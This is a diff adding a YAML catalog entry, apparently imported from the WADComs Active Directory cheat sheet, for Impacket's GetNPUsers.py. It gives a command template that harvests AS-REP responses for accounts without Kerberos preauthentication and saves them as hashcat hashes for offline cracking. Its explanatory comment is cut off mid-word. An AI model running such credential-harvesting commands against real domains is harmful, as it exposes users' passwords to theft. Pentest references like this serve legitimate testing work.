@@ -1,0 +1,30 @@
+id: wadcoms/impacket-getnpusers
+type: technique
+platform: active-directory
+name: Impacket GetNPUsers
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid username
+commands:
+- template: python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat
+    -outputfile hashes.txt
+  comment: 'Impacket''s GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given
+    list of usernames. These responses will be encrypted with the user''s password, which can then be
+    cracked offline. Command Reference: Target IP: 10.10.10.1 Domain: test.local Username Lis'
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+tags:
+- active-directory
+- wadcoms
+- kerberos
